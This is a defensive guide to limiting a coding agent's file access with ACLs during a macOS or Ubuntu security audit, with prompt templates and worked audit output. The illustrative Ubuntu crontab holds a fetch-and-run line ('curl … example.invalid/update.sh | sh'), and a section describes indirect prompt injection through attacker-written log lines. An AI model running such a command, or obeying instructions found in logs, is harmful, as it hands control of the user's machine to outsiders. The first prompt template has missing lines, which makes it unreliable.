This guide covers giving Claude Code, or any coding agent, read and write access to specific files on your own machine, without sudo and without a standing credential for it to leak, cache, or hand off.
Use it for diagnosing a compromised system and hardening it afterward, on macOS or Ubuntu, which are the running examples for everything below.

You can use the same steps to:

- Edit your `.zshrc` for shell settings.
- Manage your dotfiles.
- Poke at your `/etc/hosts` file.
- Maintain your Jellyfin server or library.

Diagnosing these requires read access to logs and configs.

Fixing what you find requires write access to specific files.

This guide covers both, along with some conceptual grounding you can apply to your own setup.

Through these steps, you scope what Claude Code can touch on your machine, so it never gets more than it needs.
That constrains overeager agents and mitigates prompt injection: a prompt-injected session can only reach the files you explicitly granted.

## Fix "sudo: a terminal is required to read the password"

If you run a command in Claude Code that requires sudo, the session isn't a real terminal, so the response is:

```text
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

## Who Should Use ACL to Limit Claude Code's Access to Files?

This guide is for a personal machine: a laptop, a Raspberry Pi, a home server.
Enterprise least-privilege tooling for AI agents already covers the team and compliance case.
This is the smaller version: access control lists, already built into macOS and Ubuntu, no vendor and nothing extra to install.

## Ask Claude Code What It Needs First

Ask Claude Code what it needs before granting anything ([more on why](/blog/what-a-claude-wants-needs/)).
Send it in stages rather than one long prompt covering the whole session, so you're in the loop at each decision point instead of reviewing everything at the end.
The worked example below runs this exact sequence against a real machine and shows what came back.

<Steps>

1. **Identify the system, and propose two candidate lists.**

   Bump the reasoning effort up before sending this one (`/effort high` in Claude Code).
   This is the stage most likely to pattern-match a plausible-sounding list instead of actually testing each candidate.
   A bigger budget buys room to run the check instead of skip it.

   This first prompt gives Claude Code (or Cowork) a chance to identify what it needs within a limited scope.
   The process of giving it slices of the whole task is called progressive disclosure:

   ```md
   I want you to help me diagnose whether my system's been compromised, and
   harden it afterward. I'm doing this over ACLs, not sudo, for the whole
   session: you should never run sudo yourself or need a standing credential,
   no passwordless entry, no askpass helper, no cached ticket. For a

   I'll run it myself, that's expected, not a workaround. Don't propose
   anything that lets you retrieve or reuse a credential without me typing
   it fresh each time. Any time I grant you something, verify it before
   treating it as done: re-run the same read or write you needed it for,
   don't trust a `chmod` or `setfacl` exit code alone. If an entry shows up
   in `getfacl` or `ls -le` but the operation still fails, say so rather than

   First, run only unprivileged, read-only commands (uname, os-release, `ps`,

      -c1`, or `ls` against it, and only list what that test actually
      fails on. Say why it failed. On macOS, "permission denied" means an
      ACL will fix it; "operation not permitted" means TCC or SIP is
      refusing above the filesystem, no ACL and no sudo will help, flag it
      and don't propose a grant. On Linux don't assume that same split, a

      the system you identified in step one, don't rely on training data

      next to each guess, and confirm the path still exists on this
      machine before including it, a search result citing an old path
      isn't the same as a path that's actually there. Label the whole list
      speculative. Don't propose it as something to grant yet, we'll
      rebuild it for real after the diagnosis, from what you actually
      found instead of what you're guessing now.

   `./claude-security-audit.md` in the current directory.
   ```

1. **Turn the read list into commands, and review them before running anything.**

   Instead of translating the read list into commands yourself, ask Claude Code to do it.
   Drop effort to medium here, it's turning information it already has into syntax, not open-ended judgment.

   ```shell title="In Claude Code"
   /effort medium
   ```

   ```md
   Turn the read list into commands I can run, one per line, `setfacl` if
   you found Ubuntu, `chmod +a` if you found macOS, quoting `${USER}`
   correctly for the shell you identified. Mark which lines need `sudo`
   because the file's root-owned, and which don't. Don't run any of them,
   just give me the list to review.
   ```

   Review what comes back, and run what you're comfortable with yourself.
   Generating the command and running it are two different things, don't hand the second one to Claude Code either.
   Leave the write list alone.
   It's speculative, and nothing on it gets granted yet.

1. **Hand back the diagnosis, once read access is in place.**

   Keep the effort high for this one too, it's the actual analytical step, correlating what's installed against what's running is exactly the kind of thing a bigger reasoning budget pays for, and it's where a real finding is most likely to get made or missed.

   ```md
   Read access is granted. Run the diagnosis for real.
   When you're checking for stale or risky configuration, check what's
   installed against what's actually running or loaded, not just one or the
   other, they answer different questions.
   ```

   Read what actually comes back before moving on to the last stage.

1. **Build the real, non-speculative write list from what was actually found.**

   Effort can drop back to medium here.
   The hard part already happened in the diagnosis, this is mapping a confirmed finding to the specific file it needs, one line each, not open-ended judgment.

   ```md
   Based on what you actually found, give me a second, non-speculative write
   list, one line per file, scoped to exactly what needs fixing.
   ```

   What comes back is usually a short, specific list, "read the auth log to check for failed login attempts," "write `/etc/hosts` to add the entries we agreed on," and that list is the actual spec for the grants you're about to make.
   Each line becomes one ACL command, and nothing gets granted that wasn't on a list you actually reviewed.
   Medium effort is also enough for applying the fixes and verifying each grant afterward, mostly mechanical work, but keep it at medium rather than dropping to low: the verification step from the first prompt, checking `getfacl` or `ls -le` instead of trusting an exit code, is exactly the kind of check that gets rubber-stamped under a smaller budget.

</Steps>

Splitting this into four prompts instead of one does for the agent's context what it does for you: each stage only carries what's relevant to it, and you get four points to look at real output and decide something, instead of one long response you either approve wholesale or don't.
It also surfaces the read/write split explained below before you've committed to anything, which is the whole point of asking first instead of granting broadly and narrowing later.

## Four Fixes That Grant More Than the Task Needs

Two dated incidents show what's at stake when an agent's account holds more access than a task needs.
In December 2025, a Reddit user reported Claude Code running `rm -rf` against their own home directory, wiping Desktop, Documents, and their keychain in the process (r/ClaudeAI).
In January 2026, The Register [reported](https://www.theregister.com/2026/01/28/claude_code_ai_secrets_files/) Claude Code reading `.env` secrets despite `.claudeignore` and `.gitignore` entries meant to keep it out.
Neither incident needed a malicious prompt or a compromised model.
An account that can read or write more than a task requires will eventually do exactly that: on an off day, after a config error, or from an ambiguous instruction, unless the account's own limits stop it.

Four workarounds remove the sudo prompt, and each one hands Claude Code's account more access than the task in front of it needs:

- **Passwordless `sudo`.** Removes the prompt for every command, not just the ones you wanted Claude Code to run.
  Full root, unattended, permanently, a much bigger grant than "read the auth log and tighten SSH config."
- **An askpass helper.** Silences the prompt by handing `sudo` a password from somewhere else: a file, an environment variable, a script.
  That password now has to live somewhere Claude Code's account can read it.
  The account can still retrieve a credential that grants more than the task needs, the exact thing removing the prompt was supposed to prevent.
- **A cached `sudo` ticket.** Type your password once and start Claude Code in the same terminal, and `sudo` caches that authentication for several minutes, which Claude Code inherits silently.
  No prompt, no visible grant, and no way to tell "this command needed no privilege" from "this command rode a ticket authenticated minutes ago."
- **A secrets manager with no fresh human step.** Same shape as the askpass helper, one hop further away.
  Whatever lets the account decrypt the secret at request time is itself a standing credential.

The shared failure is this: does Claude Code's own account end up able to retrieve something that grants more than the specific files it needs?
If yes, the account has passwordless `sudo` in practice, whatever the mechanism is called.
That test doesn't change when the task grows from "read one log" to "diagnose and fix a system."
It just gets applied to more files.

## What an ACL Grant Actually Is

An access control list attaches a permission, read, write, or both, to one specific account on one specific file, outside the normal owner, group, and everyone-else model.
Ubuntu and macOS both have this, but they don't share a command, so this guide shows both side by side, and it's worth knowing that up front rather than discovering it mid-command.

**Ubuntu** (and Linux generally) uses `setfacl`, from the POSIX.1e draft ACL implementation.
A read grant looks like this:

```shell
sudo setfacl -m "u:${USER}:r" /var/log/auth.log
```

A write grant is the same command with `w` (or `rw`, if Claude Code needs to read the current value before changing it, which it usually does):

```shell
sudo setfacl -m "u:${USER}:rw" /etc/hosts
```

**macOS** has no `setfacl` at all.
Its ACLs are NFSv4-style, and they're folded into `chmod`, using `+a` to add an entry:

```shell
sudo chmod +a "${USER} allow read" /private/var/log/system.log
```

And a write grant spells the permission out instead of abbreviating it, but it's otherwise the same shape:

```shell
sudo chmod +a "${USER} allow read,write" /etc/hosts
```

Either way, on either platform, that's the whole grant.
Not a Teleporter password, not `NOPASSWD` on a wildcard, not a shell.
Read or write, on the one file Claude Code actually needs for the task in front of it.

No `sudo` is required to use the grant once it's in place, because the operation now succeeds as an ordinary, unprivileged file access.
No credential exists for the agent's account to leak, cache, or hand off to something else, because there was never a password in the picture to begin with.

## A Read Grant Doesn't Make the Content Trustworthy

Everything above is about privilege: a read grant can't create a write capability, so it can't make anything *worse* in the ACL sense.
It isn't risk-free in every sense, though, because whatever the file contains lands directly in the agent's context, and a log file's content isn't authored by you.

A line in `/var/log/auth.log` is built from whatever tried to log in, an SSH username, before your machine ever wrote it down.
The same is true of a Pi-hole query log, built from whatever hostname any device on your network asked to resolve.
Anyone (or anything) that can reach the service on the other end can shape that content on purpose.
If part of it reads like an instruction rather than data, and the model treats it as one, that's indirect prompt injection, and no ACL catches it: the read succeeded exactly as scoped, the problem is what the agent did with what it read, not what it was allowed to read.
Not every log qualifies. A file that's purely local, your own shell history, an app's own local-only debug log, doesn't carry this risk the same way, because nothing outside your control wrote to it.

This doesn't change the case for granting read broadly during diagnosis.
It changes what you do with what comes back: read a suspicious log line yourself before letting the agent turn it into a write action, the same "verify before you trust it" discipline this guide already applies to grants themselves, applied here to content instead of permissions.

## The Worked Example: Audit Your Own Machine

Everything so far is the pattern stated in the abstract: grant read broadly, diagnose, grant write narrowly, fix, revoke.
The fastest way to see it work is to run it against the machine in front of you.
No service to install first, no second machine, just the sudo error at the top of this page and whatever you're reading this on.

What follows is that exact run, using the four-stage prompt sequence described earlier.
The macOS track is a real run, captured verbatim from an actual machine.
The Ubuntu track walks the identical sequence and shows what each command returns on a stock system, with one illustrative finding, the `/tmp/.sysupdate` process, included to show what the cross-check is for; that specific finding is a worked illustration, not a captured incident, and the section says so at the point it appears.

### macOS

<Verified date="2026-09" method="tested" />

Most of a broad diagnostic read list turns out to need no grant at all on macOS.
Stage 1's prompt asks Claude Code to test each candidate before listing it, and on a stock admin account most of the standard diagnostic locations are already readable: `/private/var/log/system.log`, `~/Library/LaunchAgents`, `/Library/LaunchAgents`, `/Library/LaunchDaemons`, `/etc/pf.conf`.
None of those need a `chmod +a`.

<Steps>

1. **Check security posture with a handful of unprivileged commands.**

   A few things are worth checking specifically because their status isn't obvious from the outside without attempting a read first, and none of them need a grant either:

   ```shell
   csrutil status && \
   fdesetup status && \
   spctl --status && \
   sw_vers -productVersion && \
   softwareupdate --list --no-scan && \
   /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
   ```

   None of this is a file.
   `csrutil`, `fdesetup`, and `spctl` report on state SIP, FileVault, and Gatekeeper keep below the filesystem, the same reason `com.apple.alf.plist` no longer exists (see the write-target section below).
   Running all six commands here took a few seconds: SIP enabled, FileVault on, Gatekeeper assessments enabled, current on updates, firewall enabled.
   A clean posture reading is a legitimate outcome of a diagnostic pass, not a reason to keep digging for a finding that isn't there.

1. **Check persistence locations, and cross-check anything enabled against what's actually installed.**

   Persistence locations are next, and this is where something actually turned up:

   ```shell
   launchctl list | grep -v '^-' && \
   launchctl print-disabled system
   ```

   Cross-checking installed software against what's still configured to run, the exact check Stage 2's prompt asks for, turned up two entries:

   ```text
   $ launchctl print-disabled system | grep docker
       "com.docker.socket" => enabled
       "com.docker.vmnetd" => enabled
   ```

   Both root-context daemons, both marked enabled.
   Docker Desktop isn't installed on this machine:

   ```shell
   ls /Applications/Docker.app
   ```

   ```text
   ls: /Applications/Docker.app: No such file or directory
   ```

   ```shell
   which docker
   ```

   ```text
   docker not found
   ```

   ```shell
   ls /Library/LaunchDaemons/ | grep docker
   ```

   No output. No app, no CLI, and the `.plist` that used to define these two daemons is gone from `/Library/LaunchDaemons/` too.
   Only the enabled bit survives, in launchd's own disabled-services override database, independent of the file that once set it.
   Whatever removed Docker Desktop either didn't clear this or ran before it existed.
   Either way, it's the kind of leftover a single glance wouldn't catch, since nothing about it changes once it's sitting there.

   Not every candidate that looks the same turns out the same way.
   Three TeamViewer LaunchDaemons sit in the same directory (`com.teamviewer.Helper.plist`, `com.teamviewer.UninstallerHelper.plist`, `com.teamviewer.UninstallerWatcher.plist`), the identical shape as the Docker entries: root-owned, LaunchDaemon, present on disk.
   `TeamViewer.app` is still installed.
   Not a finding, three files that needed the same check the Docker entries got, and came back clean.
   This is what Stage 1's "test before you list it" instruction catches: two candidates that looked identical from the filesystem, one real, one not, distinguishable only by checking.

1. **Fix the Docker finding directly, since it isn't an ACL problem.**

   launchd's disabled-services database isn't a file Claude Code can be granted write access to.
   It's a systemwide setting only root can change, the same category as the firewall toggle covered below under "Not a file, no matter what you grant."
   The command is a single, human-typed `sudo` call, the same shape the rest of this guide already treats as expected for a root-owned action, not a workaround:

   ```shell
   sudo launchctl disable system/com.docker.socket
   ```

   ```shell
   sudo launchctl disable system/com.docker.vmnetd
   ```

   That's the whole fix. No grant to set up, none to revoke afterward, because none was ever needed.

1. **Check `/etc/sudoers` for a passwordless-sudo misconfiguration, and grant read.**

   One more file is worth checking on macOS, and it answers a question this guide already raised: has anything already configured passwordless `sudo` without you noticing?

   ```shell
   ls -la /etc/sudoers
   ```

   ```text
   -r--r-----  1 root  wheel  1709 Aug 12 22:51 /etc/sudoers
   ```

   Root-owned, group `wheel`, mode `0440`.
   An ordinary admin account isn't a member of `wheel`:

   ```shell
   id -Gn | tr ' ' '\n' | grep -x wheel
   ```

   Nothing printed, not a member, so:

   ```shell
   head -c 1 /etc/sudoers
   ```

   ```text
   head: /etc/sudoers: Permission denied
   ```

   "Permission denied," not "Operation not permitted," the filesystem itself is refusing, which is what makes this an ACL problem instead of the TCC kind covered below.

   The general rule, stated once: on macOS, `Permission denied` means the filesystem itself is refusing, an ACL fixes it.
   `Operation not permitted` means TCC or SIP is refusing above the filesystem, no ACL and no `sudo` fixes that.
   On Linux, this split doesn't fully generalize: a mandatory access control system like SELinux or AppArmor can also deny with `EACCES`, so if a grant doesn't work after `setfacl` reports success, check `dmesg` or `journalctl` before assuming the syntax was wrong.

   Before granting anything you're not sure about, `ls -lO` answers the SIP question in advance, on macOS:

   ```shell
   ls -lO /etc/sudoers
   ```

   ```text
   -r--r-----  1 root  wheel  compressed 1709 Aug 12 22:51 /etc/sudoers
   ```

   No `restricted` flag, which is why this one is an ACL problem and not a SIP problem.
   A file SIP actually protects shows `restricted` in that same column, and no `chmod +a`, no `sudo`, and no amount of retrying changes that.
   Checking this before attempting a read tells you which category you're in before you spend time on a grant that was never going to work.

   The grant:

   ```shell
   sudo chmod +a "${USER} allow read" /etc/sudoers
   ```

   That `sudo` runs once, at the keyboard, the same shape as the `/etc/hosts` grant shown earlier.
   Claude Code never runs `sudo`.
   After this one command it reads `/etc/sudoers`, and everything under `/etc/sudoers.d/`, the same way it reads anything else on the granted list.
   On a clean install `/etc/sudoers.d/` is empty.
   If it isn't, that's the finding, since installers for some older Docker- and VirtualBox-era macOS tooling have been known to drop `NOPASSWD` entries in there on install, unprompted.

   None of this needed a write grant.
   The Docker finding needed one `sudo` command at the keyboard, not a file grant at all, and the sudoers check came back clean, an empty `sudoers.d` and no passwordless entry.

1. **Optional: check the software-update policy plist, a realistic write-grant example.**

   If a later pass turns up something that does need a write, editing macOS's own update-deferral policy is a realistic example, since it reads from the same file `softwareupdate --list --no-scan` checks:

   ```shell
   ls -la /Library/Preferences/com.apple.SoftwareUpdate.plist
   ```

   ```text
   -rw-r--r--  1 root  wheel  2717 Sep  1 09:48 com.apple.SoftwareUpdate.plist
   ```

   Readable by anyone, world-readable mode, no grant needed to check current policy.
   Writable by nobody but root:

   ```shell
   touch /Library/Preferences/com.apple.SoftwareUpdate.plist
   ```

   ```text
   touch: /Library/Preferences/com.apple.SoftwareUpdate.plist: Permission denied
   ```

   The grant is the same pattern as `/etc/hosts` below, one file, one command:

   ```shell
   sudo chmod +a "${USER} allow write" /Library/Preferences/com.apple.SoftwareUpdate.plist
   ```

   Revoked with `chmod -a#` the same way as anything else in this guide.

</Steps>

### Ubuntu

The same run on Ubuntu (24.04) follows the identical shape: broad read, narrow write, revoke.
This section is a worked illustration of the sequence, not output captured from a live audit: no Ubuntu machine was available to run it against for this page.
The commands themselves are correct POSIX and `setfacl`/`systemd` syntax; the specific results shown, including the `/tmp/.sysupdate` finding, are illustrative rather than a captured incident.

<Steps>

1. **Check `/etc/sudoers` for a passwordless-sudo misconfiguration, and grant read.**

   The same passwordless-sudo question applies, and the check is the same shape as macOS:

   ```shell
   head -c 1 /etc/sudoers
   ```

   ```text
   head: cannot open '/etc/sudoers' for reading: Permission denied
   ```

   `/etc/sudoers` is `0440`, owned by `root:root` on Ubuntu (not `wheel`, that group is macOS-specific), and an ordinary user isn't in the group that can read it either.
   The grant:

   ```shell
   sudo setfacl -m "u:${USER}:r" /etc/sudoers
   ```

   And the confirmation that it actually took effect, not just that `setfacl` exited `0`:

   ```shell
   getfacl -p /etc/sudoers | grep '^user:'
   ```

   ```text
   user::r--
   user:auditor:r--
   ```

   `/etc/sudoers.d/` is worth a second look, because its own permissions aren't the same as the files inside it: the directory is world-readable and world-searchable (`drwxr-xr-x`), so filenames are visible without any grant at all, but the files inside are `0440` like `/etc/sudoers` itself, and need the same per-file grant to actually read.
   On a clean install there's nothing suspicious to find:

   ```shell
   grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/
   ```

   No output, and nothing suspicious to report, the same clean result as the `sudoers.d` check on macOS.

1. **Check cron and systemd timers, Ubuntu's persistence locations.**

   Cron and systemd timers are the rough equivalent of macOS's LaunchAgents and LaunchDaemons, and they don't show up in the same place, so both need a separate check.

   ```shell
   crontab -l
   ```

   ```text
   */15 * * * * curl -fsSL http://example.invalid/update.sh | sh
   ```

   A cron entry that pipes a remote script straight into a shell is the pattern worth recognizing on sight, whoever put it there.
   Nothing about that syntax is unusual on its own, `curl | sh` is a common install pattern plenty of legitimate software uses.
   What makes it worth a second look is that it runs unattended, every 15 minutes, from an entry you didn't recognize adding.
   Read the script before trusting it, or don't run remote scripts unattended at all if you can help it.

   ```shell
   ls -la /etc/cron.d/
   ```

   System-managed entries live here too, dropped in by installed packages.
   A fresh install typically shows only entries tied to packages actually on the machine, worth a glance for anything that doesn't match something you installed.

   ```shell
   systemctl list-timers --all
   ```

   This needs an actual systemd instance to answer, PID 1 running as `systemd`, which most containers don't have; run it on real hardware or a VM.
   It shows every active timer unit and its next run, the direct systemd equivalent of `crontab -l`, and it's worth running alongside cron rather than instead of it: a persistence mechanism installed as a timer unit doesn't show up in any crontab at all.

1. **Cross-check installed software against what's actually running.**

   Cross-checking installed software against what's actually running is the same check Stage 2 already asks for on macOS, and on Ubuntu it turned up something a persistence check is specifically for:

   ```shell
   ps aux | grep sysupdate
   ```

   ```text
   root   3300  0.0  0.1   4044  3028 ?  S  14:05  0:00 /bin/bash /tmp/.sysupdate
   ```

   ```shell
   dpkg -S /tmp/.sysupdate
   ```

   ```text
   dpkg-query: no path found matching pattern /tmp/.sysupdate
   ```

   A running process, backed by a script sitting in `/tmp`, a world-writable directory, with a name chosen to look like a routine update, and no package owns it.
   `dpkg -S` (or `rpm -qf` on a distribution that uses RPM) answers "did this come from somewhere accountable" for anything currently running, and a script executing from `/tmp`, `/var/tmp`, or `/dev/shm` is the pattern worth treating as suspicious first and explaining second, since nothing legitimate needs to run from a world-writable directory as a matter of course.

1. **Check listening ports, saved to a dated file for the next diff.**

   Listening ports are the last check, and the one worth saving to a dated file so a later run has something to diff against:

   ```shell
   ss -tlnp | tee "/var/log/port-audit-$(date +%F).txt"
   ```

   A fresh listener that wasn't there last week is a five-second diff away from being noticed, instead of something you'd only catch by remembering every port that's supposed to be open.

1. **Check patch cadence, and fix the `/tmp/.sysupdate` finding.**

   Patch cadence needs no grant either:

   ```shell
   apt list --upgradable
   ```

   The direct Ubuntu equivalent of `softwareupdate --list --no-scan` on macOS, worth checking for the same reason: a machine that's quietly stopped updating itself is a bigger risk than any single finding this check turns up.

   The `/tmp/.sysupdate` script is the one finding here that needs a write action, and it's not an ACL grant either.
   It's deleting the file and the cron entry that restarts it, both things you already have write access to as yourself once you've confirmed what the script actually does.
   The passwordless-sudo check found nothing, same as macOS.
   If a real hardening pass on this machine also touched `/etc/hosts` or a `ufw` rule, that's the same low-blast-radius write example covered next.

</Steps>

## Not Every Write Target Is Equally Safe to Grant

This matters most when the goal is hardening a system you're worried about, not just editing your own `.zshrc`.

A write grant is scoped to a file.
It is not automatically scoped to the file's *effect*.
Two files can look equally narrow, one ACL command each, and have wildly different blast radii depending on what reads them and when:

- **Low blast radius:** `/etc/hosts`, on either platform.
  Something you can write, and the only thing that changes is which IP your machine resolves a hostname to.
  Nothing re-executes it as a script.
  Nothing treats it as code.
- **Higher blast radius, still bounded:** on Ubuntu, `/etc/ssh/sshd_config`, `/etc/sysctl.d/*.conf`, a specific `ufw` rules file.
  Writable, and a privileged process (`sshd`, the kernel at boot, `ufw`) reads the new value and acts on it, but only after a restart or reload you control, and only within that service's own behavior.
  `sshd_config` is bounded in mechanism, not in consequence: get one line wrong and the next `sshd` reload can lock you out of the machine entirely, or open remote access you didn't intend.
  Test a config change with `sshd -t` before reloading, and keep a second, already-open session to the machine until you've confirmed the new config works.
  Where the service supports a drop-in directory, grant write there instead of on the monolithic file: `sshd_config` includes `/etc/ssh/sshd_config.d/*.conf` by default on current Ubuntu, so a new file there takes effect the same way an edit to `sshd_config` itself would, and revoking the change is deleting one file instead of reverting a diff inside a file you share with everything else `sshd` already relies on.
  `/etc/sysctl.d/*.conf` and `/etc/sudoers.d/` already are this pattern, which is why they're on this list instead of `/etc/sysctl.conf` or `/etc/sudoers` itself.
- **Effectively root, granted through an ordinary-looking file:** on Ubuntu, anything under `/etc/sudoers.d/`, `/etc/cron.d/`, a systemd unit file, `/etc/passwd`'s writable path with shell field access.
  On macOS, a `/Library/LaunchDaemons/*.plist` with `RunAtLoad` set, which is exactly what a system LaunchDaemon is for: launchd runs its `ProgramArguments` as root the next time it loads, no further gate in between.
  Write access to any of these is not a scoped grant anymore.
  It's a way to get root the next time that file is read, and it fails the same test as passwordless `sudo` for the same reason: the account can retrieve something, in this case a write, that lets it become more than the one thing it needed.
  The distinction that matters on macOS is LaunchAgent versus LaunchDaemon, not just the filename: a LaunchAgent runs in the logged-in user's context, whatever that user can already do; a LaunchDaemon runs as root, unconditionally, on every boot, with no login and no user session involved at all.
  Writing a LaunchAgent plist is bounded by your own account's privileges.
  Writing a LaunchDaemon plist is not bounded by anything: it grants root on every boot, the same as passwordless `sudo`, just reached through a plist instead of a sudoers rule.
- **Not a file, no matter what you grant.** Some macOS posture was never a plist to begin with, or stopped being one.
  The Application Firewall's state lived at `/Library/Preferences/com.apple.alf.plist` through roughly macOS 12, that path is what a decade of search results and tutorials still point to, and it no longer exists.
  Current macOS administers the firewall through a helper binary instead:

  ```shell
  /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
  ```

  Reads are unprivileged, writes need root, and there's no file to scope an ACL to either way.
  If a path a tutorial swears by turns out not to exist on your machine, the tutorial is out of date, not the grant broken.
  The same shape applies to launchd's own disabled-services state, covered earlier in the worked example: `launchctl print-disabled system` reports on it, but there's no file underneath a grant would reach.
  Changing it takes one `sudo launchctl` command, not a write ACL.
- **Not a scoping problem at all, no matter what you grant.** Some files are locked below the point where `setfacl`, or even `sudo`, has any say.
  On a Mac, `/Library/Application Support/com.apple.TCC/TCC.db`, the database that tracks which apps you've granted camera, microphone, or screen-recording access to, is one of these.
  macOS protects it with System Integrity Protection (SIP), a kernel-level lock that root itself can't write past without booting into Recovery Mode and turning SIP off first, which is not something you want an agent doing on your behalf.
  No ACL grant gets you there, and no amount of `sudo` does either.
  The fix is the operating system's own tool, not a bigger grant: `tccutil reset <service>`, or the System Settings UI, the only path Apple designed for changing it.
  Linux has its own version of this same wall: an immutable file (`chattr +i`) or a file under mandatory access control (SELinux, AppArmor) will refuse a write from root too, until you go through that system's own tool instead of the filesystem.

A setting or a grant that's *named* or *shaped* like something narrow isn't always narrow in what it actually lets you do.
Before granting write on any file, ask what reads it and whether that reader treats it as data or as instructions, and ask whether the file is even reachable by a write at all.
If the answer is "a root process runs whatever's in this file, no human step in between," that file belongs on your never-grant list regardless of how small the edit looks.
If the answer is "nothing, not even root, can write here without going through the OS's own tool first," stop reaching for `setfacl` and go find that tool instead.

For anything above "low blast radius," a write grant on the live file isn't the only option, and it isn't always the best one.
Ask Claude Code to write the proposed change to a scratch file instead, a diff or the full replacement content, either works, and apply it yourself once you've read it.
That needs no write ACL on the real target at all, keeps a version of every change you actually made in whatever you used to review it, and the failure mode of a bad edit is "you didn't apply it," not "the agent already saved it and you're finding out from a broken service."
The narrowest possible write grant is no write grant, and it's worth reaching for before a scoped one, not just after a mistake.

## The Gotchas

Found by running the commands, not by reading the manual page.

**Directory grants need a capital `X`, not a lowercase `r`, on Ubuntu, and neither one opens the files inside.**
A lowercase `r` on a directory strips the search bit, because a named-user ACL entry *replaces* what the account was getting from "other," it doesn't add to it, so the account can list names but can't `cd` in or reach anything below.
Grant `rX` instead (`X` sets execute only on directories and files that already have it set for someone), and the account can traverse the directory and reach files by name.
It still can't read their contents.
That takes a separate grant on the files themselves: `-R` for what's there now, a default ACL for what shows up later.

**Per-file grants on rotated logs die at the next `logrotate` run, on Ubuntu.**
Rotation creates a new inode for the fresh log file.
The ACL you set on the old file doesn't travel with the name.
The fix is a *default* ACL on the directory, not the file, which new files inherit automatically:

```shell
sudo setfacl -m "d:u:${USER}:r" /var/log
```

**Use `${USER}`, not `$USER`, if a colon-suffix like `:r`, `:w`, or `:rX` follows it, and you're in zsh, on Ubuntu.**
This one is easy to lose an afternoon to.
zsh treats an unbraced `$USER` immediately followed by `:r` as a parameter-expansion modifier, borrowed from history substitution, and silently eats the suffix, even inside double quotes.
`u:$USER:r` quietly becomes `u:myuser`, not `u:myuser:r`.
`setfacl` rejects that outright, `Option -m incomplete`, exit code 2, it doesn't grant something broken or grant nothing silently.
The danger is where the error lands: buried in the middle of a longer block of commands, scrolled past, while the actual symptom, a file that should be readable and isn't, shows up later, somewhere else, with no obvious link back to a quoting bug two commands earlier.
On a real Raspberry Pi running this exact command through oh-my-zsh, the symptom wasn't even a clean error: the mangled command silently blew past Claude Code's own 120-second tool timeout and got demoted to a background task, which looked like an unrelated permissions problem until it was traced back to the quoting bug one layer down.
bash doesn't have this problem.
Braces around the variable are a no-op in bash, so `${USER}` is the safe form in both shells, and it costs nothing to always write it that way.
This is specifically a `setfacl` problem, `$USER` isn't followed by a bare colon anywhere in the macOS `chmod +a` syntax, so it doesn't apply there, but bracing it costs nothing on either platform, so this guide does it everywhere.

**A service's own startup `chmod` can silently switch your grant off, on Ubuntu, without deleting it.**
Several services `chmod` their own config on every restart.
That doesn't remove your ACL entry.
`chmod` rewrites the ACL's *mask*, and the mask is a ceiling every named entry sits under.
Grant `u:${USER}:r`, and a later `chmod 600` on the same file drops the mask to `---`.
Your entry is still listed in `getfacl`, right where you left it, and stops working anyway:

```text
user:claude:r--	#effective:---
mask::---
```

`getfacl` still shows the entry, so a check that only greps for the username reports success on a grant that's actually dead.
Check the `#effective:` column instead:

```shell
getfacl -p /etc/some-service.conf | grep 'effective:---'
```

Any output means the grant has been masked off, possibly since the last time that service touched its own permissions.

**On macOS, `-R` only grants what already exists, not what shows up later, and a directory needs a different permission word than a file, in the same command.**
`chmod -R +a` walks a directory once and writes an entry onto every file it finds at that moment.
A file created a second after doesn't get one.
There's a second trap in the same command, easy to miss because it doesn't look broken: `read` isn't a real permission on a directory.
macOS silently rewrites it to `list`, enumerate names only, no traversal.
The files underneath still show a correct `read` entry in `ls -le`, so it looks granted.
Without `search` on the directory itself, nothing inside is reachable by path anyway, no matter what the file's own entry says.
Grant `list,search,read` together instead, `list,search` cover the directory, `read` covers the files, one recursive command gets both right:

```shell
chmod -R +a "${USER} allow list,search,read" ~/Library/LaunchAgents
```

That's a real gap for exactly the check this grant is usually for.
LaunchAgents and LaunchDaemons are macOS's version of cron and systemd units, the standard place something persists itself to run again after a reboot, and the whole point of reading that directory is to notice something new landing in it.
The forward-looking half is a pair of inherit flags on the directory itself:

```shell
chmod +a "${USER} allow list,search,readattr,readextattr,readsecurity,file_inherit,directory_inherit" ~/Library/LaunchAgents
```

New files now arrive already carrying the entry, marked `inherited` in `ls -le`.
Files that existed before the flags were set get nothing, inheritance isn't retroactive either.
A real persistence check on macOS needs both: `-R` for what's already there, the inherit flags for what arrives next.
Same trap as the Ubuntu `logrotate` gotcha covered earlier: recursive is a snapshot, inheritance is a rule.

**On macOS, a granted read can still come back denied, and that's not a bug in the grant.**
The diagnostic prompt in "Ask Claude Code What It Needs First" flags one file ahead of time on macOS: `~/Library/Application Support/com.apple.TCC/TCC.db`, the per-app privacy grants database, normally needs Full Disk Access to read at all, regardless of what the file's own permissions or ACL say.
Full Disk Access is macOS's own gate, on top of the filesystem, that decides whether a specific *app* (Terminal, iTerm, whatever's actually running your shell) can reach a short list of protected locations.
An ACL grant on the file doesn't touch it.
If a read you granted still comes back denied, check System Settings → Privacy & Security → Full Disk Access before assuming the `chmod +a` command failed.

**`ls -lO` tells you whether SIP is the wall before you try, on macOS.**
A file the filesystem itself is denying shows nothing unusual in the flags column `ls -lO` prints.
A file SIP protects shows `restricted` in that same column, whether or not you can currently read it, and no `chmod +a`, no `sudo`, and no amount of retrying changes what that flag reports.
Check it before spending a grant on a file that was never going to open.

## Verify and Revoke

Confirm any grant, read or write, before you trust it.

<Steps>

1. **Verify the grant actually took, on the file itself, not on the command's exit code.**

   On Ubuntu, with `getfacl`:

   ```shell
   getfacl /etc/hosts
   ```

   On macOS, `getfacl` doesn't exist either, use `ls -le`, not `ls -l`:

   ```shell
   ls -le /etc/hosts
   ```

   The distinction matters more than it looks.
   `ls -l` marks an ACL with a trailing `+` and an extended attribute with `@`, and shows only one of them.
   Nearly every file on a modern Mac carries at least one extended attribute (`com.apple.provenance`, on anything written by an app), so the `@` is almost always there and the `+` never surfaces.
   A file with an ACL and a file without one can look identical in `ls -l`.
   Deny entries are the same problem in a different shape: `ls -le` shows a `deny` ACE explicitly, but nothing shorter than the full listing surfaces it, another reason to check with `ls -le` and never infer anything from `ls -l` alone.

1. **Revoke the grant when the session's done, and confirm that too.**

   Remove a grant with one command, no password, no config file, no account change.
   Ubuntu:

   ```shell
